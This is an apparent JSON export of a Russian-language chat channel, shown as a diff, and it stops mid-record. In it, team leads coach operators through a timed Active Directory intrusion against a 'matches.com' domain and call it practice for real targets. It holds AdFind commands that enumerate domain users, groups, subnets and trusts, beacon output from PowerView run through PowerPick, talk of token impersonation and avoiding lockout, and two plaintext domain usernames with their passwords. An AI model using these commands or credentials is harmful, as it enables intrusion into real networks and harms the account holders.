@@ -1,0 +1,3165 @@
+{
+  "messages": [
+    {
+      "_id": "L82SdFBzvYpuJJ24t",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "`AdFind -b \"OU=NewYork,DC=Contoso,DC=com\" -s one -dn`\nтам ниже пример такой есть",
+      "ts": "2020-10-03T15:32:19.807Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-03T15:32:19.831Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gaYniyFqRG4LWTE2H",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\nвыше отсюда взял как в попыхах понял",
+      "ts": "2020-10-03T15:30:54.782Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:30:54.815Z",
+      "urls": [
+        {
+          "url": "https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx"
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "it8kXBw6ZXZoF67CG",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "формата DC=server,DC=com",
+      "ts": "2020-10-03T15:30:45.870Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:30:45.904Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "W6jEdzcpNs3mLGtzX",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "окей",
+      "ts": "2020-10-03T15:30:37.582Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:30:37.614Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XEHxdj9LFWemy3Krz",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "-b параметр",
+      "ts": "2020-10-03T15:30:32.575Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:30:32.633Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Ctzr35jbnRWrE48Zq",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nshell adfind.exe -f \"(objectcategory=person)\" -s base > ad_users.txt\n```",
+      "ts": "2020-10-03T15:30:30.024Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:30:30.072Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YFYnprc6wm75tw76g",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "base куда пихать?",
+      "ts": "2020-10-03T15:28:18.205Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:28:18.247Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7XscAMwZfeyg5DQNP",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nC:\\Users\\Administrator\\Desktop\\ping>adfind.exe -f \"(objectcategory=person)\"  1>ad_users.txt \n\nAdFind V01.49.00.00cpp Joe Richards (joe@joeware.net) February 2015\n\nLDAP_BIND: [] Error 0x51 (81) - Server Down\nTerminating program.\n\nC:\\Users\\Administrator\\Desktop\\ping>adfind.exe -f \"objectcategory=computer\"  1>ad_computers.txt \n\nAdFind V01.49.00.00cpp Joe Richards (joe@joeware.net) February 2015\n\nLDAP_BIND: [] Error 0x51 (81) - Server Down\nTerminating program.\n\nC:\\Users\\Administrator\\Desktop\\ping>adfind.exe -f \"(objectcategory=organizationalUnit)\"  1>ad_ous.txt \n\nAdFind V01.49.00.00cpp Joe Richards (joe@joeware.net) February 2015\n\nLDAP_BIND: [] Error 0x51 (81) - Server Down\nTerminating program.\n\nC:\\Users\\Administrator\\Desktop\\ping>adfind.exe -subnets -f (objectCategory=subnet) 1>subnets.txt \n\nAdFind V01.49.00.00cpp Joe Richards (joe@joeware.net) February 2015\n\nLDAP_BIND: [] Error 0x51 (81) - Server Down\nTerminating program.\n\nC:\\Users\\Administrator\\Desktop\\ping>adfind.exe -f \"(objectcategory=group)\"  1>ad_group.txt \n\nAdFind V01.49.00.00cpp Joe Richards (joe@joeware.net) February 2015\n\nLDAP_BIND: [] Error 0x51 (81) - Server Down\nTerminating program.\n\nC:\\Users\\Administrator\\Desktop\\ping>adfind.exe -gcb -sc trustdmp  1>trustdmp.txt \n\nAdFind V01.49.00.00cpp Joe Richards (joe@joeware.net) February 2015\n\nLDAP_BIND: [] Error 0x51 (81) - Server Down\nTerminating program\n```",
+      "ts": "2020-10-03T15:27:50.267Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:27:50.447Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LDssvFuZuNCXZtkzw",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "у вас еще 4 минуты",
+      "ts": "2020-10-03T15:26:30.397Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:26:30.428Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rDRvQqpK4ngqsrwdE",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "если нет, то гугл",
+      "ts": "2020-10-03T15:26:23.958Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:26:23.989Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KDW6z7HNuxc4JJXub",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "если указать base",
+      "ts": "2020-10-03T15:26:18.350Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:26:18.383Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nL2qbhAp2eiciQGj9",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "а адфайн не сработает под токеном интересно?",
+      "ts": "2020-10-03T15:26:14.071Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:26:14.099Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "wxDxhmu8PDE3DZTum",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "не длины паролей",
+      "ts": "2020-10-03T15:25:45.650Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:25:45.675Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "P9s35eZnAZ35HiE6G",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "тут не локаута",
+      "ts": "2020-10-03T15:25:43.390Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:25:43.421Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fXmZuC6X6QjZGWAmR",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "окей аналог net accounts в powerview как получить?",
+      "ts": "2020-10-03T15:25:39.312Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:25:39.346Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "h5LoCEMbHZsk2Hw8K",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Другое дело)",
+      "ts": "2020-10-03T15:25:26.420Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:25:26.452Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6eJWyTsFLEjJQj55N",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n\nUnicode         : @{Unicode=yes}\nSystemAccess    : @{RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0}\nKerberosPolicy  : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; \n                  TicketValidateClient=1}\nVersion         : @{signature=\"$CHICAGO$\"; Revision=1}\nPrivilegeRights : @{SeBatchLogonRight=System.Object[]; \n                  SeLoadDriverPrivilege=*S-1-5-21-742535178-4155275036-2790254320-513}\nEventAudit      : @{AuditDSAccess=1}\nRegistryValues  : \nPath            : \\\\matches.com\\sysvol\\matches.com\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\\n                  MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\nGPOName         : {31B2F340-016D-11D2-945F-00C04FB984F9}\nGPODisplayName  : Domain - Default Domain Policy\n```",
+      "ts": "2020-10-03T15:25:12.156Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:25:12.287Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hcmXmWEdZmN5kkPyf",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "`MATCHES\\Louisad M@tches2020!!`\n`MATCHES\\mercedesd Dinham2323`",
+      "ts": "2020-10-03T15:25:09.467Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-03T15:25:09.493Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Q2HYoARX7rkYYA66d",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "в jobs висит",
+      "ts": "2020-10-03T15:24:49.198Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:24:49.220Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GwDRf8zC68yGDiZ4q",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "отрабатывает сейчас",
+      "ts": "2020-10-03T15:24:43.557Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:24:43.586Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "R9toxdqAa5LzTiACB",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "сделал токен Луизы, запросил DomainPolicy",
+      "ts": "2020-10-03T15:24:40.378Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:24:40.405Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9dRPquNRo6J3R7Xis",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "в конфу добавил",
+      "ts": "2020-10-03T15:23:04.667Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:23:04.696Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MvJ4729NymLgt66yF",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "и переходим к новому материалу",
+      "ts": "2020-10-03T15:23:00.425Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:23:00.464Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "JGFQpPMEfTD92aN6B",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "8 мин на это все",
+      "ts": "2020-10-03T15:22:53.666Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:22:53.700Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "u4yZtQBHraGdsGNFb",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "токен должен завести.",
+      "ts": "2020-10-03T15:22:43.141Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:22:43.168Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vEuTmA2ExRTWSZmhZ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "[ ](https://mediaeveryone.com/group/matches?msg=BjGADji9jwnSK3pjt) сейчас делаем",
+      "ts": "2020-10-03T15:22:42.295Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:22:42.324Z",
+      "attachments": [
+        {
+          "text": "под токеном доменного пользака пробовали?",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/group/matches?msg=BjGADji9jwnSK3pjt",
+          "attachments": [],
+          "ts": "2020-10-03T15:22:07.457Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/matches?msg=BjGADji9jwnSK3pjt",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "spMhtsahN7RWofwbf",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "@tl1 ага, верно",
+      "ts": "2020-10-03T15:22:30.583Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:22:30.620Z",
+      "mentions": [
+        {
+          "_id": "yJcaRFnKQqepiffHq",
+          "username": "tl1",
+          "name": "Team Lead 1"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "BjGADji9jwnSK3pjt",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "под токеном доменного пользака пробовали?",
+      "ts": "2020-10-03T15:22:07.457Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-03T15:22:07.498Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Q3aq7sq2nHzY3xFb7",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "авторизация впна идет через радиус скорее всгео а не напрямую через ад, понимаешь? \nты обращаешься с ПК который НЕ ЗНАЕТ про домен из под контекста пользователя который НЕ в домене",
+      "ts": "2020-10-03T15:22:05.635Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:22:05.664Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ERCcDN5w6voizoLgY",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ищите способ обращения с указанием domain credentials",
+      "ts": "2020-10-03T15:21:02.206Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:21:02.237Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kB63M8fLGXaBPxk4w",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "вот заебись - ОФИС - давайте еще 1000 сообщений\nчего блядь молчите\nне поняли - КРИКНУЛИ в офисе - кто понял? никто блядь\nтак пишите сюда по 100000000 сообщений\nя уже это вам объяснил\nкакого х я должен в это лезть еще раз и объяснять тут теперь",
+      "ts": "2020-10-03T15:21:01.823Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:21:01.860Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GkgbSjra53CL7FkCT",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "и ты не запускаешь из под доменного юзера",
+      "ts": "2020-10-03T15:20:35.501Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:20:35.537Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "S2MXKeDuofN5Qu9MA",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "контекст потому что. ваша машина не заведена в домен",
+      "ts": "2020-10-03T15:20:29.946Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:20:29.974Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LPq5Q7W9STXeNfekF",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "+1",
+      "ts": "2020-10-03T15:20:00.412Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-03T15:20:00.440Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "abHtaN643Bcx2mEDj",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n[*] 10/03 18:17:46 - Executing PowerView Get-DomainPolicyData via PowerPick\n[*] Tasked beacon to run: Get-DomainPolicyData -Domain matches.com (unmanaged)\n[+] host called home, sent: 133715 bytes\n[+] received output:\nERROR: Exception calling \"FindAll\" with \"0\" argument(s): \"The specified domain either does not exist or \nERROR: could not be contacted.\nERROR: \"\nERROR: At line:13117 char:24\nERROR: +                 else { $Results = $GPOSearcher.FindAll() }\nERROR: +                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nERROR:     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\nERROR:     + FullyQualifiedErrorId : COMException\nERROR:  \n\n```",
+      "ts": "2020-10-03T15:19:55.520Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:19:55.670Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6u9RenBN5cH4ZfRQD",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "окей, ад_юзерс снимается через powerview нормально, почему когда я снимаю DomainPolicy мне выдаёт \"неправильные креды у вас тут\"?\nвсё снимается без кредов, тут запара",
+      "ts": "2020-10-03T15:19:42.936Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-03T15:20:24.477Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-03T15:20:24.476Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "BjeXi527KsDEsWnHg",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "в реальных объектах",
+      "ts": "2020-10-03T15:19:23.481Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:23.506Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vKn3JuCZ2eAG9EJTT",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "там не будет времени думать",
+      "ts": "2020-10-03T15:19:19.021Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:19.049Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yY5nXSZNw7qvBkdZt",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "с заебами вас",
+      "ts": "2020-10-03T15:19:11.614Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:11.639Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BaXpdrDo42MYKBCxf",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1000 сообщений",
+      "ts": "2020-10-03T15:19:05.802Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:05.823Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "r7BzNuCBZY2EKuajN",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:19:00.759Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:00.809Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pkcK9wocjTssCDffz",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:19:00.752Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:00.786Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7TCYTfAKZBw6NbuF2",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:19:00.650Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:00.672Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GoHaEPeLM6Xq3re24",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:19:00.535Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:00.558Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mFj3n6wHEfAJPjf6m",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:19:00.427Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:00.449Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xX6GXggBQKuQP9DKR",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:19:00.218Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:00.245Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "btxeYCJfToSANuobz",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:19:00.113Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:19:00.138Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BzRHKETzCpQWthDRP",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:18:59.946Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:18:59.963Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Yq5xbw475fv9LHGrw",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:18:59.326Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:18:59.351Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XfLnNfPL3yiBuskeZ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "1",
+      "ts": "2020-10-03T15:18:58.750Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:18:58.791Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ov3esEFeNa7KJpyBt",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "где",
+      "ts": "2020-10-03T15:18:58.049Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:18:58.088Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Wj2j9YQfb2nDWpw4F",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "я уже сообщил офису",
+      "ts": "2020-10-03T15:18:56.105Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:18:56.152Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "S5ZHuKFJDczjpuTu8",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "нет оправданий - в реальных объектах будет не до тупежа\nесли блдяь я не вижу тут того что ребята пишут по 100 раз что блядь делать и таймер идет на минуты, то это хуйня какая то",
+      "ts": "2020-10-03T15:18:51.975Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:18:52.002Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZZs4auMhJAvqmQo3G",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "тут аналитическая проблема\nтупеж всилу отсутствия опыта, а не \"нажатия кнопок\"",
+      "ts": "2020-10-03T15:17:59.614Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:17:59.643Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YkjwvoAZENcZyNqKP",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "если вопросы ко мне есть - свяжитесь со мной напрямую",
+      "ts": "2020-10-03T15:17:23.300Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:17:23.339Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "phv6jByYmvkGe6HeS",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Дискорд посттавить занимает 5 минут",
+      "ts": "2020-10-03T15:16:54.200Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:16:54.242Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "R3igArL2Bf5TWjxZs",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ТимЛид1, ТимЛид2 - пусть все ставят себе Дискорд и расшаривают свои экраны \nраз они такие умные, то пусть покажут вам \"товар лицом\" в реал тайме\nи станет все ясно",
+      "ts": "2020-10-03T15:16:43.211Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-10-03T15:16:43.255Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "aoc8WdphwoEJiX92F",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "уже хотя бы потому что стандартные полиси на ресет это 30 минут",
+      "ts": "2020-10-03T15:13:23.861Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:13:23.897Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BoCgPohfGzBi2Ka8b",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "то локаута не будет",
+      "ts": "2020-10-03T15:13:13.786Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:13:13.813Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "g3t2hrtud6pAQSeE7",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "если чекали вчера",
+      "ts": "2020-10-03T15:13:08.764Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-03T15:13:08.791Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dyHnz3ZpBJJTRQhJ6",
+      "rid": "b3waFmEkyep694hCq",
